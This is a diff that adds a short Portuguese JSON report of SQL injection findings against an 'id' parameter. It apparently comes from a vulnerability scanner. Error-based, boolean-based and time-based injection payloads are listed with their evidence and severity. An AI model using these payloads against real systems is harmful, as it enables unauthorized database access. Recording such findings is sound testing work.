@@ -1,0 +1,23 @@
+[
+  {
+    "tipo": "sqli_baseado_em_erro",
+    "parametro": "id",
+    "payload": "' OR '1'='1",
+    "evidencia": "Baseline retornou 1 linha(s); payload retornou 5 linha(s)",
+    "severidade": "alta"
+  },
+  {
+    "tipo": "sqli_booleano",
+    "parametro": "id",
+    "payload": "1' AND '1'='1 / 1' AND '1'='2",
+    "evidencia": "Condição verdadeira retornou dado; condição falsa retornou vazio — resposta muda com a lógica SQL injetada",
+    "severidade": "alta"
+  },
+  {
+    "tipo": "sqli_baseado_em_tempo",
+    "parametro": "id",
+    "payload": "1' OR SLEEP(3)-- -",
+    "evidencia": "Baseline respondeu em 0.01s; payload com SLEEP(3) respondeu em 12.03s",
+    "severidade": "alta"
+  }
+]
